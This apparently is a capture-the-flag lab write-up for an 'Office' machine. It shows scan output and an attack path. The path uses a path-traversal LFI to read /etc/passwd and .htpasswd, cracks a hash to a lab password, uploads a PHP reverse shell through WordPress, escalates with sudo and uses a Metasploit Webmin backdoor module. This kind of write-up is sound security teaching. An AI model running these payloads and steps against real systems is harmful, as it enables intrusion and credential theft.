---
tags: [Challenge, Linux, Video]
title: Office
created: '2020-05-26T12:25:46.534Z'
modified: '2020-10-02T17:40:21.502Z'
---

# Office
- IP: `172.31.3.1`
- OS: `Linux`
## General
### Usernames
- dwight (Author on port 80)
- jim (To be fired)
- meredith ([forum](https://office.csl/forum/))
- creed ([forum](https://office.csl/forum/))
- andy ([forum](https://office.csl/forum/))
- phyllis ([forum](https://office.csl/forum/))
- oscar ([forum](https://office.csl/forum/))
- kevin ([forum](https://office.csl/forum/))
- angela ([forum](https://office.csl/forum/))
### Credentials
- dwight:cowboys1
## Enumeration
### Writeup
We see that both port 80 and 443 are open. Taking a look at those, we notice that port 443 just has the default apache page

`WordPress 5.4.1` runs on port 80

We find the forum on port 443 and on the [login](https://office.csl/forum/login/login.php) page, it says `Login is done via User-Agent to access the forum.`

However, when looking at the chatlogs, we saw a `?file` GET parameter. By inputting `../../../../../../../../etc/passwd`, we can get LFI

Using this LFI, we can get access to [`.htpasswd`](https://office.csl/forum/chatlogs/chatlogs.php?file=../../../../../../../../var/www/html/forum/.htpasswd), which contains `dwight:$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/ `, which we can crack to `cowboys1`

We can use these credentials to log into [wordpress](http://office.csl/wp-admin/)

In the file manager, we create a php file and upload `/usr/share/webshells/php/php-reverse-shell.php`
### Commands
#### NMap
`nmap -p 1-65535 -T4 -A -v 172.31.3.1`
<details>
<markdown>
```bash
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA)
|   256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA)
|_  256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519)
80/tcp    open     http             Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.4.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dunder Mifflin &#8211; Just another WordPress site
443/tcp   open     ssl/http         Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US
| Issuer: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-08T20:01:51
| Not valid after:  2021-05-08T20:01:51
| MD5:   e159 faf3 e637 25ad 7d95 3210 9a69 bce6
|_SHA-1: adee e6e5 1566 a86f c8d9 6d7e 1fc0 2239 e21e 92ef
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
10000/tcp filtered snet-sensor-mgmt
32195/tcp filtered unknown
```
</markdown>
</details>
<markdown>
#### GoBuster
- 80
  - `gobuster dir --wordlist /usr/share/wordlists/dirb/big.txt --url http://office.csl/ -x html,js,txt -o commands/gobuster-80-root`
```bash
/license.txt (Status: 200)
/readme.html (Status: 200)
/server-status (Status: 403)
/wp-admin (Status: 301)
  /css (Status: 301)
  /images (Status: 301)
  /includes (Status: 301)
  /js (Status: 301)
  /maint (Status: 301)
  /network (Status: 301)
  /user (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
```
- 443
  - `gobuster dir -k --wordlist /usr/share/wordlists/dirb/big.txt --url https://office.csl/ -x php,txt -o commands/gobuster-443-root`
```bash
/forum (Status: 301)
  /css (Status: 301)
  /images (Status: 301)
  /index.php (Status: 200)
  /login (Status: 301)
/server-status (Status: 403)
/wordpress (Status: 301)
```
#### WPScan
`wpscan --url http://office.csl/`
</markdown>
<details>
<markdown>
```bash
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://office.csl/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://office.csl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://office.csl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Latest, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.csl/?feed=rss2, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://office.csl/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://office.csl/wp-content/themes/twentytwenty/
 | Last Updated: 2020-05-14T00:00:00.000Z
 | Readme: http://office.csl/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://office.csl/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.csl/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.
```
</markdown>
</details>
<markdown>
#### John
`john --wordlist=/usr/share/wordlists/rockyou.txt dwight-htpasswd-hash`


## Enumeration as www-data
### Writeup
`sudo -l` shows us we can `(dwight) NOPASSWD: /bin/bash`
### Commands
`sudo -u dwight /bin/bash`


## Enumeration as dwight
### Writeup
When we curl the port 10000, which was filtered earlier, we get a webpage, let's try to forward that with ssh (~C) `-L10000:localhost:10000` and we see webmin is running here.

Exploit webmin using: `linux/http/webmin_backdoor` in msf


### Commands
</markdown>
